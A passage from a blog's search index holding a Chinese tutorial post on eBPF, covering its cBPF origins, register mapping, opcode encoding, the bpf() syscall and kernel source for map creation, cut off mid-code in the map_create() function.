<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>eBPF:Redemption</title>
    <link href="/2024/02/06/eBPF-Redemption/"/>
    <url>/2024/02/06/eBPF-Redemption/</url>
    
    <content type="html"><![CDATA[<blockquote><p>由于本人刚打通大表哥结局，十分感伤，因此文章标题与内容没有任何联系:’(</p></blockquote><h1 id="第一章：犁刀村"><a href="#第一章：犁刀村" class="headerlink" title="第一章：犁刀村"></a>第一章：犁刀村</h1><p>介绍eBPF之前，有必要了解一下他的前身，也就是BPF（Berkeley Packet Filter），现在为了同eBPF（external BPF）区分开来被称作cBPF（classic BPF）</p><blockquote><p><strong>伯克利包过滤器</strong>（英语：Berkeley Packet Filter，缩写 BPF），是<a href="https://zh.wikipedia.org/wiki/%E7%B1%BBUnix">类Unix</a>系统上<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82">数据链路层</a>的一种原始接口，提供原始链路层<a href="https://zh.wikipedia.org/wiki/%E5%B0%81%E5%8C%85">数据包</a>的收发。除此之外，如果网卡驱动支持<a href="https://zh.wikipedia.org/wiki/%E6%B7%B7%E6%9D%82%E6%A8%A1%E5%BC%8F">混杂模式</a>，那么它可以让网卡处于此种模式，这样可以收到<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C">网络</a>上的所有包，不管他们的目的地是不是所在<a href="https://zh.wikipedia.org/wiki/%E4%B8%BB%E6%A9%9F">主机</a>。</p><p>另外，BPF支持过滤数据包——用户态的进程可以提供一个过滤程序来声明它想收到哪些数据包。通过这种过滤可以避免从<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a><a href="https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8">内核</a>向用户态复制其他对用户态程序无用的数据包，从而极大地提高性能。</p></blockquote><p>从3.18版本开始，Linux 内核提供了一种扩展的BPF虚拟机，被称为“extended BPF”，简称为eBPF。它能够被用于非网络相关的功能，比如附在不同的tracepoints上，从而获取当前内核运行的许多信息。</p><p>传统的BPF，现在被称为cBPF（classical BPF）。</p><p>eBPF由Alexei Starovoitov在PluMgrid工作时设计，这家公司专注于研究新的方法来设计<a href="https://zh.wikipedia.org/wiki/%E8%BB%9F%E9%AB%94%E5%AE%9A%E7%BE%A9%E7%B6%B2%E8%B7%AF">软件定义网络</a>解决方案。在它只是一个提议时，Daniel Borkmann——Red Hat公司的内核工程师，帮助修改使得它能够进入内核代码并完全替代已有的BPF实现。这是二十年来BPF首次主要的更新，使得BPF成为了一个通用的虚拟机。</p><p>eBPF被Linux内核合并的事件线如下</p><ul><li>2014年3月。eBPF补丁被合并到Linux内核。</li><li>2014年6月。JIT组件被合并到内核3.15版本。</li><li>2014年12月。bpf系统调用被合并到内核3.18版本。</li><li>在后来的Linux 4.x系列版本中又添加了对于kprobes、uprobes、tracepoints以及perf_events的支持。</li></ul><p>因为eBPF虚拟机使用的是类似于汇编语言的指令，对于程序编写来说直接使用难度非常大。和将C语言生成汇编语言类似，现在的编译器正在逐步完善从更高级的语言生成BPF虚拟机使用的指令。LLVM在3.7版本开始支持BPF作为后端输出。GCC 10也将会支持BPF作为后端。BCC是IOVisor项目下的编译器工具集，用于创建内核跟踪（tracing）工具。bpftrace是为eBPF设计的高级跟踪语言，在Linux内核（4.x）中提供。</p><p>eBPF现在被应用于网络、跟踪、内核优化、硬件建模等领域。</p><p>以下类容大部分来自于linux官方手册</p><blockquote><p>eBPF is designed to be JITed with one to one mapping, which can also open up the possibility for GCC&#x2F;LLVM compilers to generate optimized eBPF code through an eBPF backend that performs almost as fast as natively compiled code.</p></blockquote><p>这里告诉我们eBPF被设计为一对一映射的动态翻译，这也使得GCC&#x2F;LLVM编译器通过后端eBPF产生优化eBPF代码成为可能，从而能达到原生编译代码一样的运行速度</p><h2 id="1-cBPF-to-eBPF"><a href="#1-cBPF-to-eBPF" class="headerlink" title="1.cBPF to eBPF"></a>1.cBPF to eBPF</h2><p>cBPF到eBPF有以下几种变化(这里仅列出个人认为适合当下自身学习的部分)</p><ul><li><p>寄存器从2个增加了10个</p><p>旧格式有两个寄存器A和X，以及一个隐藏帧指针。新布局将其扩展到 10 个内部寄存器和一个只读帧指针。所有 eBPF 寄存器都一对一映射到 x86_64、aarch64 等上的硬件寄存器，并且 eBPF 调用约定直接映射到 64 位架构上内核使用的 ABI。并且之恩能够有一个eBPF程序，也就是说唯一一个eBPF主线程，并且他不能调用其他eBPF函数，它只能调用预定义的内核函数</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">R0</span> - <span class="hljs-built_in">rax</span><br><span class="hljs-built_in">R1</span> - <span class="hljs-built_in">rdi</span><br><span class="hljs-built_in">R2</span> - <span class="hljs-built_in">rsi</span><br><span class="hljs-built_in">R3</span> - <span class="hljs-built_in">rdx</span><br><span class="hljs-built_in">R4</span> - <span class="hljs-built_in">rcx</span><br><span class="hljs-built_in">R5</span> - <span class="hljs-built_in">r8</span><br><span class="hljs-built_in">R6</span> - <span class="hljs-built_in">rbx</span><br><span class="hljs-built_in">R7</span> - <span class="hljs-built_in">r13</span><br><span class="hljs-built_in">R8</span> - <span class="hljs-built_in">r14</span><br><span class="hljs-built_in">R9</span> - <span class="hljs-built_in">r15</span><br><span class="hljs-built_in">R10</span> - <span class="hljs-built_in">rbp</span><br></code></pre></td></tr></table></figure></li><li><p>在内核函数调用之前，eBPF 程序需要将函数参数放入 R1 到 R5 寄存器中以满足调用约定，然后解释器将从寄存器中取出它们并传递给内核函数。如果 R1 - R5 寄存器映射到用于在给定架构上传递参数的 CPU 寄存器，则 JIT 编译器不需要发出额外的移动。函数参数将位于正确的寄存器中，并且 BPF_CALL 指令将被 JIT 为单个“调用”硬件指令。选择此调用约定是为了涵盖常见的调用情况，而不会影响性能。</p><p>在内核函数调用之后，R1 - R5 被重置为不可读，并且 R0 具有函数的返回值。由于 R6 - R9 是被调用者保存的，因此它们的状态在整个调用过程中都会保留。</p><p>这里需要注意每一个eBPF程序都会有且只有一个自带的参数<code>ctx</code>,他默认保存在R1当中</p></li></ul><p>eBPF重用了经典的大部分操作码编码，以简化cBPF到eBPF的转换</p><p>对于算术和跳转指令，8位<code>代码</code>字段分为三个部分</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------------+</span>--------<span class="hljs-code">+--------------------+</span><br>|   4 bits       |  1 bit |   3 bits           |<br><span class="hljs-section">| operation code | source | instruction class  |</span><br><span class="hljs-section">+----------------+--------+--------------------+</span><br>(MSB)                                      (LSB)<br></code></pre></td></tr></table></figure><p>其中LSB的3bits存储着指令的类别：</p><table><thead><tr><th align="left">Classic BPF classes</th><th align="left">eBPF classes</th></tr></thead><tbody><tr><td align="left">BPF_LD 0x00</td><td align="left">BPF_LD 0x00</td></tr><tr><td align="left">BPF_LDX 0x01</td><td align="left">BPF_LDX 0x01</td></tr><tr><td align="left">BPF_ST 0x02</td><td align="left">BPF_ST 0x02</td></tr><tr><td align="left">BPF_STX 0x03</td><td align="left">BPF_STX 0x03</td></tr><tr><td align="left">BPF_ALU 0x04</td><td align="left">BPF_ALU 0x04</td></tr><tr><td align="left">BPF_JMP 0x05</td><td align="left">BPF_JMP 0x05</td></tr><tr><td align="left">BPF_RET 0x06</td><td align="left">BPF_JMP32 0x06</td></tr><tr><td align="left">BPF_MISC 0x07</td><td align="left">BPF_ALU64 0x07</td></tr></tbody></table><p>而第四位表示编码源操作数</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">BPF_K     <span class="hljs-number">0</span>x00 <span class="hljs-regexp">/* 使用32位立即数作为源操作数 */</span><br>BPF_X     <span class="hljs-number">0</span>x08 <span class="hljs-regexp">/* 使用‘src_reg’寄存器作为源操作数 */</span><br></code></pre></td></tr></table></figure><p>然后MSB的高四位存储操作代码：</p><ol><li><p>如果说instruction class 是 BPF_ALU或者 BPF_ALU64[in eBPF]，则该操作码为以下之一：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BPF_ADD </span>  <span class="hljs-number">0x00</span><br><span class="hljs-keyword">BPF_SUB </span>  <span class="hljs-number">0x10</span><br><span class="hljs-keyword">BPF_MUL </span>  <span class="hljs-number">0x20</span><br><span class="hljs-keyword">BPF_DIV </span>  <span class="hljs-number">0x30</span><br><span class="hljs-keyword">BPF_OR </span>   <span class="hljs-number">0x40</span><br><span class="hljs-keyword">BPF_AND </span>  <span class="hljs-number">0x50</span><br><span class="hljs-keyword">BPF_LSH </span>  <span class="hljs-number">0x60</span><br><span class="hljs-keyword">BPF_RSH </span>  <span class="hljs-number">0x70</span><br><span class="hljs-keyword">BPF_NEG </span>  <span class="hljs-number">0x80</span><br><span class="hljs-keyword">BPF_MOD </span>  <span class="hljs-number">0x90</span><br><span class="hljs-keyword">BPF_XOR </span>  <span class="hljs-number">0xa0</span><br><span class="hljs-keyword">BPF_MOV </span>  <span class="hljs-number">0xb0</span>  <span class="hljs-comment">/* eBPF only: mov reg to reg */</span><br><span class="hljs-keyword">BPF_ARSH </span> <span class="hljs-number">0xc0</span>  <span class="hljs-comment">/* eBPF only: sign extending shift right */</span><br><span class="hljs-keyword">BPF_END </span>  <span class="hljs-number">0xd0</span>  <span class="hljs-comment">/* eBPF only: endianness conversion */</span><br></code></pre></td></tr></table></figure></li><li><p>如果说instruction class 是 BPF_JMP或者 BPF_JMP32[in eBPF]，则该操作码为以下之一：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BPF_JA </span>   <span class="hljs-number">0x00</span>  <span class="hljs-comment">/* BPF_JMP only */</span><br><span class="hljs-keyword">BPF_JEQ </span>  <span class="hljs-number">0x10</span><br><span class="hljs-keyword">BPF_JGT </span>  <span class="hljs-number">0x20</span><br><span class="hljs-keyword">BPF_JGE </span>  <span class="hljs-number">0x30</span><br><span class="hljs-keyword">BPF_JSET </span> <span class="hljs-number">0x40</span><br><span class="hljs-keyword">BPF_JNE </span>  <span class="hljs-number">0x50</span>  <span class="hljs-comment">/* eBPF only: jump != */</span><br><span class="hljs-keyword">BPF_JSGT </span> <span class="hljs-number">0x60</span>  <span class="hljs-comment">/* eBPF only: signed &#x27;&gt;&#x27; */</span><br><span class="hljs-keyword">BPF_JSGE </span> <span class="hljs-number">0x70</span>  <span class="hljs-comment">/* eBPF only: signed &#x27;&gt;=&#x27; */</span><br><span class="hljs-keyword">BPF_CALL </span> <span class="hljs-number">0x80</span>  <span class="hljs-comment">/* eBPF BPF_JMP only: function call */</span><br><span class="hljs-keyword">BPF_EXIT </span> <span class="hljs-number">0x90</span>  <span class="hljs-comment">/* eBPF BPF_JMP only: function return */</span><br><span class="hljs-keyword">BPF_JLT </span>  <span class="hljs-number">0xa0</span>  <span class="hljs-comment">/* eBPF only: unsigned &#x27;&lt;&#x27; */</span><br><span class="hljs-keyword">BPF_JLE </span>  <span class="hljs-number">0xb0</span>  <span class="hljs-comment">/* eBPF only: unsigned &#x27;&lt;=&#x27; */</span><br><span class="hljs-keyword">BPF_JSLT </span> <span class="hljs-number">0xc0</span>  <span class="hljs-comment">/* eBPF only: signed &#x27;&lt;&#x27; */</span><br><span class="hljs-keyword">BPF_JSLE </span> <span class="hljs-number">0xd0</span>  <span class="hljs-comment">/* eBPF only: signed &#x27;&lt;=&#x27; */</span><br></code></pre></td></tr></table></figure></li></ol><p>因此这里举例子 bpf指令<code>BPF_ADD|BPF_X|BPF_ALU</code>在cBPF和eBPF中都表示经典32位加法。cBPF中只有两个寄存器，意味着A+&#x3D;X。而在eBPF中意味着dst_reg &#x3D; (u32)dst_reg + (u32)src_reg</p><p>cBPF使用BPF_MISC类来表示A&#x3D;X和X&#x3D;A移动，eBPF则使用 <code>BPF_MOV |BPF_X|BPF_ALU</code>来表示。eBPF中将类别7用作BPF_ALU64,这里等价于BPF_ALU但是是使用64为操作数。</p><p>经典 BPF 浪费了整个 BPF_RET 类来表示单个 <code>ret</code> 操作。经典 BPF_RET | BPF_K表示将imm32复制到返回寄存器并执行函数退出。 eBPF 被建模为匹配 CPU，因此 <code>BPF_JMP|BPF_EXIT</code>在eBPF中表示函数退出。 eBPF 程序需要在执行 BPF_EXIT 之前将返回值存储到寄存器 R0 中。 eBPF 中的第 6 类用作 BPF_JMP32，表示与 BPF_JMP 完全相同的操作，但使用 32 位宽的操作数进行比较。</p><hr><p>而对于加载和存储指令指令，8位<code>代码</code>字段分为三个部分</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+--------+</span>--------<span class="hljs-code">+-------------------+</span><br>| 3 bits | 2 bits |   3 bits          |<br><span class="hljs-section">|  mode  |  size  | instruction class |</span><br><span class="hljs-section">+--------+--------+-------------------+</span><br>(MSB)                             (LSB)<br></code></pre></td></tr></table></figure><p>size字段如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">BPF_W   <span class="hljs-number">0</span>x00    <span class="hljs-regexp">/* word */</span><br>BPF_H   <span class="hljs-number">0</span>x08    <span class="hljs-regexp">/* half word */</span><br>BPF_B   <span class="hljs-number">0</span>x10    <span class="hljs-regexp">/* byte */</span><br>BPF_DW  <span class="hljs-number">0</span>x18    <span class="hljs-regexp">/* eBPF only, double word */</span><br></code></pre></td></tr></table></figure><p>mode字段如下：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BPF_IMM </span>    <span class="hljs-number">0x00</span>  <span class="hljs-comment">/* used for 32-bit mov in classic BPF and 64-bit in eBPF */</span><br><span class="hljs-keyword">BPF_ABS </span>    <span class="hljs-number">0x20</span><br><span class="hljs-keyword">BPF_IND </span>    <span class="hljs-number">0x40</span><br><span class="hljs-keyword">BPF_MEM </span>    <span class="hljs-number">0x60</span><br><span class="hljs-keyword">BPF_LEN </span>    <span class="hljs-number">0x80</span>  <span class="hljs-comment">/* classic BPF only, reserved in eBPF */</span><br><span class="hljs-keyword">BPF_MSH </span>    <span class="hljs-number">0xa0</span>  <span class="hljs-comment">/* classic BPF only, reserved in eBPF */</span><br><span class="hljs-keyword">BPF_ATOMIC </span> <span class="hljs-number">0xc0</span>  <span class="hljs-comment">/* eBPF only, atomic operations */</span><br></code></pre></td></tr></table></figure><h2 id="2-eBPF的基本架构"><a href="#2-eBPF的基本架构" class="headerlink" title="2.eBPF的基本架构"></a>2.eBPF的基本架构</h2><p><img src="https://s2.loli.net/2022/03/20/HfExF3JwKX9nOvi.png"></p><p>上图为eBPF的一个经典图，其中也是显示了一个eBPF程序的运行过程：</p><ol><li>用户自行产生BPF字节码</li><li>将该字节码加载到内核空间</li><li>内核空间的eBPF verifier 对字节码程序进行检查，通过检查后进行JIT编译</li><li>程序当中可能会创建内核同用户交互的eBPF maps</li></ol><p>下面是man手册当中的eBPF程序、maps与绑定事件之间的映射关系</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">tracing     tracing    tracing    packet      packet     packet<br>event A     event B    event C    on eth0     on eth1    on eth2<br> |<span class="hljs-string">             </span>|<span class="hljs-string">         </span>|<span class="hljs-string">          </span>|<span class="hljs-string">           </span>|<span class="hljs-string">          ^</span><br><span class="hljs-string"> </span>|<span class="hljs-string">             </span>|<span class="hljs-string">         </span>|<span class="hljs-string">          </span>|<span class="hljs-string">           v          </span>|<br> --&gt; tracing <span class="hljs-variable">&lt;--     tracing      socket    tc ingress   tc egress</span><br><span class="hljs-variable">      prog_1          prog_2      prog_3    classifier    action</span><br><span class="hljs-variable">       |  |              |          |         prog_4      prog_5</span><br><span class="hljs-variable">    |---  -----|  |------|         map_3        |           |</span><br><span class="hljs-variable">  map_1       map_2                             --| map_4 |--</span><br><span class="hljs-variable"></span><br></code></pre></td></tr></table></figure><h1 id="第二章：马掌望台"><a href="#第二章：马掌望台" class="headerlink" title="第二章：马掌望台"></a>第二章：马掌望台</h1><p>这一章我将直接从man手册中以及linux源码当中分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size)</span>;<br></code></pre></td></tr></table></figure><h2 id="1-eBPF-maps-概述"><a href="#1-eBPF-maps-概述" class="headerlink" title="1.eBPF maps 概述"></a>1.eBPF maps 概述</h2><p>BPF map可以通过bpf系统调用来进行读写</p><p>下面介绍与bpf系统调用相关的参数：</p><p><code>cmd</code>: </p><ul><li><code>BPF_MAP_CREATE</code>:创建一个map并且返回一个指向该map的文件描述符</li><li><code>BPF_MAP_LOOKUP_ELEM</code>:通过给定的key在指定的map当中寻找元素，并且返回他的值</li><li><code>BPF_MAP_UPDATE_ELEM</code>:创建或者更新一个元素（当然也是给定key在指定map当中寻找）</li><li><code>BPF_MAP_DELETE_ELEM</code>:删除元素</li><li><code>BPF_AP_GET_NEXT_KEY</code>:寻找给定key的下一个元素</li><li><code>BPF_PROG_LOAD</code>:验证且加载一个eBPF程序，返回一个与该程序关联的文件描述符</li></ul><p><code>attr</code>:</p><p>他指向一个bpf_attr结构体，他的结构如下（由于linux 6.7源码当中过大，所以这里仅给出手册给出的版本，应该是很具有代表性的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> &#123;</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* Used by BPF_MAP_CREATE */</span><br> __u32         map_type;<br> __u32         key_size;    <span class="hljs-comment">/* size of key in bytes */</span><br> __u32         value_size;  <span class="hljs-comment">/* size of value in bytes */</span><br> __u32         max_entries; <span class="hljs-comment">/* maximum number of entriesin a map */</span><br> &#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* Used by BPF_MAP_*_ELEM and BPF_MAP_GET_NEXT_KEY commands */</span><br>__u32         map_fd;<br>__aligned_u64 key;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__aligned_u64 value;<br>__aligned_u64 next_key;<br>&#125;;<br>__u64         flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* Used by BPF_PROG_LOAD */</span><br>__u32         prog_type;<br>__u32         insn_cnt;<br>__aligned_u64 insns;      <span class="hljs-comment">/* &#x27;const struct bpf_insn *&#x27; */</span><br>__aligned_u64 license;    <span class="hljs-comment">/* &#x27;const char *&#x27; */</span><br>__u32         log_level;  <span class="hljs-comment">/* verbosity level of verifier */</span><br>__u32         log_size;   <span class="hljs-comment">/* size of user buffer */</span><br>__aligned_u64 log_buf;    <span class="hljs-comment">/* user supplied &#x27;char *&#x27;buffer */</span><br>__u32         kern_version;<br><span class="hljs-comment">/* checked when prog_type=kprobe(since Linux 4.1) */</span><br>&#125;;<br>&#125; __attribute__((aligned(<span class="hljs-number">8</span>)));<br><br></code></pre></td></tr></table></figure><p>maps 是一个存放不同类型数据的数据结构体，他可以在不同的eBPF内核程序内共享数据，同样可以使得内核和用户应用间共享。接下来详细介绍每个字段的使用</p><h2 id="2-BPF-MAP-CREATE"><a href="#2-BPF-MAP-CREATE" class="headerlink" title="2.BPF_MAP_CREATE"></a>2.BPF_MAP_CREATE</h2><p>示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">bpf_create_map</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> bpf_map_type map_type,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size,</span><br><span class="hljs-params">                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size,</span><br><span class="hljs-params">                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>    .map_type    = map_type,<br>    .key_size    = key_size,<br>    .value_size  = value_size,<br>    .max_entries = max_entries<br>        &#125;;<br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr, <span class="hljs-keyword">sizeof</span>(attr));<br>&#125;<br></code></pre></td></tr></table></figure><p>这里直接讲解其中所涉及到的源码部分,在系统调用判定cmd之前会有一些安全性的检查，这里我们先掠过，等到基础扎实了再进行了解</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">5385</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> __sys_bpf(<span class="hljs-type">int</span> cmd, <span class="hljs-type">bpfptr_t</span> uattr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size)<br><span class="hljs-number">5386</span> &#123;<br><span class="hljs-number">5387</span>     <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span>;</span>                                                     <br><span class="hljs-number">5388</span>     <span class="hljs-type">int</span> err;<br>.....<br><span class="hljs-number">5404</span>     <span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-number">5405</span>     <span class="hljs-keyword">case</span> BPF_MAP_CREATE:<br><span class="hljs-number">5406</span>         err = map_create(&amp;attr);<br><span class="hljs-number">5407</span>         <span class="hljs-keyword">break</span>;<br><br></code></pre></td></tr></table></figure><p>所以直接看到下面代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* kernel/bpf/syscall.c */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">map_create</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;   <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops</span>;</span><br>        <span class="hljs-type">int</span> numa_node = bpf_map_attr_numa_node(attr);<br>        u32 map_type = attr-&gt;map_type;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">map</span>;</span><br>        <span class="hljs-type">int</span> f_flags;<br>        <span class="hljs-type">int</span> err;<br>.......<br>        map_type = attr-&gt;map_type;<br>    .......<br>        <span class="hljs-comment">/* check privileged map type permissions */</span><br>        <span class="hljs-keyword">switch</span> (map_type) &#123;<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_ARRAY:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_PERCPU_ARRAY:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_PROG_ARRAY:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_PERF_EVENT_ARRAY:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_CGROUP_ARRAY:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_ARRAY_OF_MAPS:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_HASH:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_PERCPU_HASH:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_HASH_OF_MAPS:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_RINGBUF:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_USER_RINGBUF:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_CGROUP_STORAGE:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE:<br>                <span class="hljs-comment">/* unprivileged */</span><br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_SK_STORAGE:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_INODE_STORAGE:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_TASK_STORAGE:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_CGRP_STORAGE:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_BLOOM_FILTER:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_LPM_TRIE:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_REUSEPORT_SOCKARRAY:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_STACK_TRACE:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_QUEUE:<br>        <span class="hljs-keyword">case</span> BPF_MAP_TYPE_STACK:<br>        <span class="hljs-keyword">case</span> 